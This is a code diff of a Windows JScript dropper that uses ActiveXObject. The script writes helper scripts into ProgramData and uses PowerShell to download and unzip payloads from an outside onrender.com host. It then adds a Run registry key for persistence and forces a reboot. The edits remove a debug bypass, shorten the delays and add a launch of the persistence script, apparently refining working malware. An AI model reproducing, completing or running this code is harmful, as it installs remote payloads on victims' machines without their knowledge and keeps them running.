@@ -32,7 +32,7 @@
     var p = new ActiveXObject("Scripting.FileSystemObject");
     var s = new ActiveXObject("Scripting.FileSystemObject");
     var x = new ActiveXObject("Scripting.FileSystemObject");
-    if (1 || !p.FileExists("C://ProgramData//8292.png")) { // need to remove 1
+    if (!p.FileExists("C://ProgramData//8292.png")) {
       var o = p.CreateTextFile("C://ProgramData//kohl.js", 2 , true); // 2=true=overwrite, true=unicode
       o.writeline("var shell = new ActiveXObject('WScript.shell');var exec = shell.run('cmd.exe /c powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\8292.png https://cti-1dir.onrender.com/news',0,true);");o.Close();
       shell.run("C://ProgramData//kohl.js", 1);
@@ -46,17 +46,17 @@
       // var shell = new ActiveXObject('WScript.Shell');
       var h = p.CreateTextFile("C://ProgramData//update.js", 2, true);
       h.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(100);var exec = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\dvixm\\\\mm1.zip https://cti-1dir.onrender.com/mm1',0 , true);");
-      h.writeline("WScript.Sleep(120000);");
+      h.writeline("WScript.Sleep(60000);");
       h.writeline("var execUnzip = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -Command \"Expand-Archive -Path C:\\\\ProgramData\\\\dvixm\\\\mm1.zip -DestinationPath C:\\\\ProgramData\\\\dvixm\\\\mm1\"', 0, true);");
       h.Close();shell.run("C://ProgramData//update.js", 1);
       // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm', and mm1.exe in ProgramData }
       
       var ss = s.CreateTextFile("C://ProgramData//parhai.js", 2, true);
-      ss.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(180000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');ss.Close();
-
+      ss.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(80000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');ss.Close();
+      shell.run("C://ProgramData//parhai.js", 1);
       // reboot
       var r = p.CreateTextFile("C://ProgramData//r.js", 2, true);
-      r.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(200000);var exec = shell.run('cmd.exe /k shutdown /r /f /t 0',0,true);");r.Close();shell.run("C://ProgramData//r.js", 1);
+      r.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(100000);var exec = shell.run('cmd.exe /k shutdown /r /f /t 0',0,true);");r.Close();shell.run("C://ProgramData//r.js", 1);
     }
     
 </script>
